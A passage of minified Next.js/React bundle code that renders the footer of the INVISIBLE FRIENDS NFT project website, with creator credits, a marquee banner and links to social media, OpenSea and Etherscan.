                                    children: "INVISIBLE FRIENDS are thought up, drawn and animated by this one Swedish dude."
                                }), (0, a.jsx)("p", {
                                    children: (0, a.jsx)("a", {
                                        href: "http://twitter.com/MotionMarkus",
                                        children: (0, a.jsx)("img", {
                                            src: "/twitter-logo.svg",
                                            alt: "Twitter",
                                            className: "inline-block w-6 text-white md:w-8"
                                        })
                                    })
                                })]
                            }), (0, a.jsxs)("div", {
                                className: "space-y-4",
                                children: [(0, a.jsx)("img", {
                                    src: "/rcc.png",
                                    className: "mx-auto w-24 rounded-full",
                                    alt: "Handshake"
                                }), (0, a.jsxs)("h3", {
                                    className: "font-fatfrank text-yellow-200 md:text-5xl",
                                    children: ["Random Character", (0, a.jsx)("br", {}), "Collective"]
                                }), (0, a.jsx)("p", {
                                    className: "mx-auto max-w-lg",
                                    children: "INVISIBLE FRIENDS are a proud member of Random Character Collective. The internet's friendliest animator collective."
                                }), (0, a.jsx)("p", {
                                    children: (0, a.jsx)("a", {
                                        href: "http://twitter.com/rndmcharacters",
                                        children: (0, a.jsx)("img", {
                                            src: "/twitter-logo.svg",
                                            alt: "Twitter",
                                            className: "inline-block w-6 text-white md:w-8"
                                        })
                                    })
                                })]
                            })]
                        }), (0, a.jsx)("div", {
                            className: "font-fatfrank text-outline-marquee bg-yellow-200 py-2 text-3xl uppercase text-yellow-200",
                            children: (0, a.jsx)(l.Z, {
                                direction: "right",
                                gradient: !1,
                                children: Array.from(new Array(10)).map((function(e, t) {
                                    return (0, a.jsx)("span", {
                                        children: "Nice to unsee you \xb7\xa0"
                                    }, t)
                                }))
                            })
                        }), (0, a.jsx)("nav", {
                            className: "p-10 lg:p-16",
                            children: (0, a.jsxs)("div", {
                                className: "mx-auto flex flex-col space-y-6 text-center",
                                children: [(0, a.jsx)(r.default, {
                                    href: "/",
                                    children: (0, a.jsx)("a", {
                                        children: (0, a.jsx)("img", {
                                            src: "/bingbong.svg",
                                            alt: "bing bong",
                                            className: "inline-block w-16 text-white md:w-24"
                                        })
                                    })
                                }), (0, a.jsxs)("div", {
                                    className: "space-x-4",
                                    children: [(0, a.jsx)("a", {
                                        className: "",
                                        href: "https://twitter.com/InvsbleFriends",
                                        children: (0, a.jsx)("img", {
                                            src: "/twitter-logo.svg",
                                            alt: "Twitter",
                                            className: "inline-block w-6 text-white md:w-8"
                                        })
                                    }), (0, a.jsx)("a", {
                                        className: "",
                                        href: "https://www.instagram.com/invisiblefriends_io/",
                                        children: (0, a.jsx)("img", {
                                            src: "/instagram.svg",
                                            alt: "Instagram",
                                            className: "inline-block w-6 text-white md:w-8"
                                        })
                                    }), (0, a.jsx)("a", {
                                        className: "",
                                        href: "https://discord.gg/rndm",
                                        children: (0, a.jsx)("img", {
                                            src: "/discord-logo.svg",
                                            alt: "Discord",
                                            className: "inline-block w-6 text-white md:w-8"
                                        })
                                    }), (0, a.jsx)("a", {
                                        className: "",
                                        href: "https://opensea.io/collection/invisiblefriends",
                                        children: (0, a.jsx)("img", {
                                            src: "/opensea-logo.svg",
                                            alt: "OpenSea",
                                            className: "inline-block w-6 text-white md:w-8"
                                        })
                                    }), (0, a.jsx)("a", {
                                        className: "",
                                        href: "https://etherscan.io/address/0x59468516a8259058bad1ca5f8f4bff190d30e066",
                                        children: (0, a.jsx)("img", {
                                            src: "/etherscan-logo.svg",
                                            alt: "Etherscan",
                                            className: "inline-block w-6 text-white md:w-8"
                                        })
                                    })]
                                }), (0, a.jsx)("div", {
                                    className: "h-2"
                                }), (0, a.jsx)("div", {
                                    className: "flex justify-center text-base space-x-4",
                                    children: (0, a.jsx)(r.default, {
                                        href: "/provable-fairness",
                                        children: (0, a.jsx)("a", {
                                            className: "underline",
                                            children: "Provable fairness"
                                        })
                                    })
                                })]
                            })
                        })]
                    })
                }
        }
    },
    function(e) {
        e.O(0, [498, 774, 888, 179], (function() {
            return t = 5301, e(e.s = t);
            var t
        }));
        var t = e.O();
        _N_E = t
    }
]);